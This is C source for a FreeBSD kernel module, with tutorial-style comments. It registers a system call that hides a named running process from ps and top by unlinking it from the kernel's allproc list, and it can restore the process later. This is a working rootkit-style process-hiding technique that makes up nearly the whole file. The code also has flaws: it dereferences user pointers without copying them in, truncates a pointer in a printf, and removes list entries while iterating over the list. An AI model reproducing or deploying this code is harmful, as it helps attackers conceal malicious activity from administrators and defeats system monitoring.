#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/queue.h>
#include <sys/lock.h>
#include <sys/sx.h>
#include <sys/mutex.h>
#include <sys/sysproto.h>

// OK so this code will hide a running process so that it is no
// longer reported by ps or top. 

// The code is written as a system call and is loaded into an
// empty slot in the sysent table. 

// The following is the argument passed to this system call:
// it is the name of the commmand that is running in the
// process. In ps, this would be in the right hand side column - right most.

struct process_hiding_args {
// The command name: this is a maximum of around 19 characters.
// The flag is used to figure out whether to restore the process
// or to hide it.
	int flag;
	char * p_comm;
// The pointer to pointer below is the output parameter which 
// will contain the address of the removed proc struct. This
// is used during the restore process.
	struct proc  * * ptr;
};

// The code below is for the system call that will hide the process

static int processhiding(struct thread *td, void * syscall_args) {
	struct process_hiding_args *uap;
	uap = (struct process_hiding_args *) syscall_args;

	struct proc* p  = NULL;


// Here is the pointer to the struct that represents the proc that will
// be hidden. This is removed from the all proc list.

// allproc_lock is a kernel data structure that lists all the non zombie
// procs in the system.
// the sx_lock call applies a shared exclusive lock on this data
// structure.
	sx_xlock(&allproc_lock);
// Below is the code segment for restoring the proc back to the list.
// Here the LIST_INSERT_HEAD macro will insert the proc into
// the head of the list. And then release the lock and exit.
	if ((uap->flag == 1) && *uap->ptr) {
		LIST_INSERT_HEAD(&allproc, *uap->ptr, p_list);
		sx_xunlock(&allproc_lock);
		return 0;
	}
// Once the lock has been acquired, then the iteration is done on this list

// LIST_FOREACH is a macro that takes three parameters. The first one
// is the variable (pointer) that receives the entry removed from the
// list. The second parameter is the list head. The third one is 
// the struct that defines each entry in the allproc array.

	LIST_FOREACH(p, &allproc, p_list) {

// The entry is locked here, so that the manipulation can be done.
		PROC_LOCK(p);

// If this is not a running process, we unlock the process.
		if (!p->p_vmspace || (p->p_flag & P_WEXIT)) {
			PROC_UNLOCK(p);

			continue;
		}



// If it is a running process, we do a strncmp to see whehther
// the process name matches the incoming parameter.
		if (strncmp(p->p_comm, uap->p_comm, MAXCOMLEN) == 0) {
			LIST_REMOVE(p, p_list);
	//		uprintf("Flag is set to %d \n", uap->flag);
// Below the address of the removed proc is stored in the output
// parameter.
			*uap->ptr = p;
			printf("%x\n", (unsigned int)p);
		}

		PROC_UNLOCK(p);
	}

// Finally we unlock the individual entry and release the shared exclusive
// lock as well.

	sx_xunlock(&allproc_lock);

	return(0);
}



// I had considerable angst including kernel panic because I forgot
// to update the argument count in the struct below. 
		
static struct sysent process_hiding_sysent = {
	3,
	processhiding
};

static int offset = NO_SYSCALL;


static int load(struct module * module, int cmd, void * arg) {

	int error = 0;

	switch(cmd) {
		case MOD_LOAD:
			uprintf("System call loaded at offset %d\n", offset);
			break;
		case MOD_UNLOAD:
			uprintf("Unloaded system call\n");
			break;
		default:
			error = EOPNOTSUPP;
			break;
	}

	return error;
}

SYSCALL_MODULE(processhiding, &offset, &process_hiding_sysent, load, NULL);


	
